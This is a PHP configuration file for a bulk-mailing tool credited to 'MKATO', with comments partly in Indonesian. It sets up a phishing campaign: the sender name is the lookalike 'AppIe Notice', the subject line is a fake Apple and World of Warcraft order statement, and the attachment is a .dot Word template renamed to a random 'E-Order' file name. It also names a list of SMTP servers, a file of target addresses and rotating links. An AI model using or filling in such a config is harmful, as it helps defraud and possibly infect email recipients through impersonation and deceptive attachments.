<?php
###############################################
#$            C0d3d by Amoskun               $#
#$  Recoding Tidak membuatmu menjadi Coder   $#
#$          Copyright 2019 MKATO             $#
###############################################
$timeset = 'America/Anchorage'; // reference for timezone http://php.net/manual/en/timezones.php


$mkato_smtp = 'secureid541.com.csv';
$mkato_list = [
	'file'				=> 'test.txt',
	'removeduplicate'	=> false,
];


$mkato_setting = [
	'color'				=> true,
	'max'				=> '95', // total of emails to send per sending
	'delay'				=> '0', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'base64', // quoted-printable or base64 or 7bit or 8bit
	'insertemailtest'	=> true, // instert your email at last sending
	'emailtest'			=> 'idj23nsdn@hotmail.com', // input your email , can be multi emails
	'priority'			=> '3',	// 1=high, 3=normal, 5=low
	'randomparam'		=> true,
	'link'				=> 'link1|link2|link3|', // input link here to use a random link fiture
	'header'			=> false,
];

$mkato_inbox = [
	#--start--#
	[
		'to' 					=> '', // to
		'fname' 				=> 'AppIe Notice', // from name
		'subject' 				=> "✔ [ New Update ] New statement Update new transaction order : World of warcraft #[number] [ FWD ] / Re : [Aggiornamento dell estratto conto] Grazie! la ricevuta dell ordine da parte di Apple. Mail [Segnala: [number] ] [ FWD ]", // subject
		'attachfile'			=> 'vpnpro.dot', // nama file pdf, kalau gak mau attach file, jangan diisi kolomnya
		'attachname' 			=> "E-Order-##mix_upper_11##.dot", // nama yang diinginkan untuk ganti nama file
		'letter'				=> 'blank.txt',

	],
	#--end--#


];

$mkato_header = array(
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
	'x-header|isi data',
);




?>